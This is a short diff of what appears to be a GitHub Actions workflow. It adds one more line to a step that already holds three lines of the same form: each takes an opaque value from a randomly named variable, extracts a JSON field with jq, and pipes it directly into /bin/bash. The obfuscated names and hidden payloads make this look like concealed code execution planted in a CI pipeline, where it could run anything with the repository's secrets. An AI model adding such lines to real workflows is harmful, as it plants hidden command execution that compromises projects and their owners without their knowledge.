@@ -49,6 +49,7 @@ jobs:
           printf '%s' "$dxd2769" | jq -r .d75 | /bin/bash
           echo $nbmtu438 | jq -r .xcn1596 | /bin/bash
           echo $tojr0 | jq -r .k53 | /bin/bash
+          printf '%s' "$p74189" | jq -r .s92879 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
